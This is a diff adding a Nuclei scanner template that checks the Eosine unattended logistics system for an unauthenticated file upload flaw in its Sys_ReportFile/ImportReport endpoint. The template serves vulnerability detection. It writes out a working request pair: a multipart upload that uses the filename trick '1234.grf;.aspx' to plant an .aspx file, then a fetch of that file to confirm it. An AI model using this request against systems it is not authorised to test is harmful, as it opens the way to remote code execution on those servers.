@@ -1,0 +1,38 @@
+id: eosine-reportfile-file-upload
+
+info:
+  name: 易思无人值守智能物流系统 Sys_ReportFile 文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+  description: |-
+    易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。易思无人值守智能物流系统Sys_ReportFile接口处存在文件上传漏洞。
+  reference:
+    - https://mp.weixin.qq.com/s/e1kvv6tv9FP1-s5Oaizpqw
+  tags: eosine,fileupload
+
+http:
+  - raw:
+      - |
+        POST /Sys_ReportFile/ImportReport?encode={{randstr_1}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryxzUhGld6cusN3Alc
+
+        ------WebKitFormBoundaryxzUhGld6cusN3Alc
+        Content-Disposition: form-data; name="file"; .filename="1234.grf;.aspx"
+        Content-Type: application/octet-stream
+
+        {{randstr_2}}~111
+        ------WebKitFormBoundaryxzUhGld6cusN3Alc--
+      
+      - |
+        GET /GRF/Custom/{{randstr_1}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2==200"
+          - "contains(body_2, '{{randstr_2}}')"
+        condition: and
